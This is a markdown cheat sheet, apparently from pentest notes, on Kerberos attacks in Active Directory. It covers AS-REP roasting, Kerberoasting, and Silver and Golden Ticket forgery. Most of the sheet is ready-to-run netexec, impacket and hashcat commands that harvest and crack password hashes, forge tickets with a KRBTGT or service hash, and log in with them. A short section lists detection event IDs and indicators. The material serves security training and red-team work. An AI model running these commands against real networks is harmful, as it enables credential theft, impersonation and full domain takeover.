# Kerberoast-Attacks

## 🔹 Overview

Kerberos is the default authentication protocol used in Active Directory environments. Attackers abuse weaknesses in Kerberos to extract credentials and escalate privileges.

This file covers the most common Kerberos-based attacks:

* AS-REP Roasting
* Kerberoasting
* Silver Ticket
* Golden Ticket

---

# 🔹 AS-REP Roasting

> Targets user accounts that do not require Kerberos pre-authentication.

### Attack Idea:

If **pre-authentication is disabled**, an attacker can request a Kerberos response containing encrypted data that can be cracked offline.

---

### Commands:

```bash id="asrep_1"
netexec ldap DC-IP -d domain -u users.txt -p '' --asreproast ASREProastables.txt
```

```bash id="asrep_2"
hashcat -m 18200 ASREProastables.txt rockyou.txt --force
```

🔹 Impact:

* Extract password hashes for user accounts
* Offline cracking → credential compromise

---

# 🔹 Kerberoasting

> Targets service accounts by requesting Service Tickets (TGS) for SPNs.

### Attack Idea:

* Request Kerberos service tickets for accounts with SPNs
* Extract encrypted ticket
* Crack offline to recover service account password

---

### Commands:

```bash id="kerb_1"
impacket-GetUserSPNs -dc-ip DC-IP 'domain/username:password' -request -outputfile kerberoasting-hash.txt
```

```bash id="kerb_2"
hashcat -m 13100 kerberoasting-hash.txt rockyou.txt --force
```

🔹 Impact:

* Compromise service accounts
* Often leads to privilege escalation if service accounts are overprivileged

---

# 🔹 Silver Ticket

> Forged Kerberos service ticket (TGS) for a specific service.

### Attack Idea:

* Requires NTLM hash of a service account
* Allows authentication to a specific service without contacting the KDC

---

### Example (MSSQL):

```bash id="silver_1"
impacket-ticketer -nthash Hash -domain-sid DomainSID -domain DOMAIN -spn doesnotmatter/DC-FQDN administrator
```

```bash id="silver_2"
KRB5CCNAME=administrator.ccache impacket-mssqlclient -k DC-FQDN
```

🔹 Impact:

* Access a specific service (e.g., MSSQL, CIFS)
* No interaction with Domain Controller required
* Harder to detect than Golden Tickets

---

# 🔹 Golden Ticket

> Forged Ticket Granting Ticket (TGT) using the KRBTGT account hash.

### Attack Idea:

* Requires **KRBTGT NTLM hash**
* Grants full domain authentication privileges

---

### Commands:

```bash id="golden_1"
impacket-ticketer -nthash krbtgtNThash -domain-sid DomainSID -domain DOMAIN administrator
```

```bash id="golden_2"
KRB5CCNAME=administrator.ccache netexec smb DC-FQDN --use-kcache
```

🔹 Impact:

* Full domain compromise
* Persistent access (until KRBTGT is rotated twice)
* Can impersonate any user

---

# 🔹 Summary of Attacks

| Attack          | Target                  | Requirement          | Impact                     |
| --------------- | ----------------------- | -------------------- | -------------------------- |
| AS-REP Roasting | Users without pre-auth  | No password needed   | Crackable hashes           |
| Kerberoasting   | Service accounts (SPNs) | Valid domain account | Service account compromise |
| Silver Ticket   | Specific service        | Service account hash | Service-level access       |
| Golden Ticket   | Entire domain           | KRBTGT hash          | Full domain compromise     |

---

# 🔹 Tools Used

* **Impacket**
* **netexec**
* **hashcat**

---

# 🔹 Detection & Defense (Blue Team Insight)

### Key Event IDs:

* **4768** → TGT requests
* **4769** → TGS requests
* **4771** → Kerberos pre-auth failures

### Indicators:

* High volume of TGS requests (Kerberoasting)
* Accounts without pre-auth enabled
* Unusual ticket lifetimes or usage patterns
* Golden Ticket usage → anomalous TGT behavior

---

# 🔹 Key Takeaways

* Kerberos attacks are central to Active Directory compromise
* Kerberoasting and AS-REP roasting enable offline password cracking
* Silver and Golden Tickets enable impersonation attacks
* KRBTGT compromise = full domain control

---
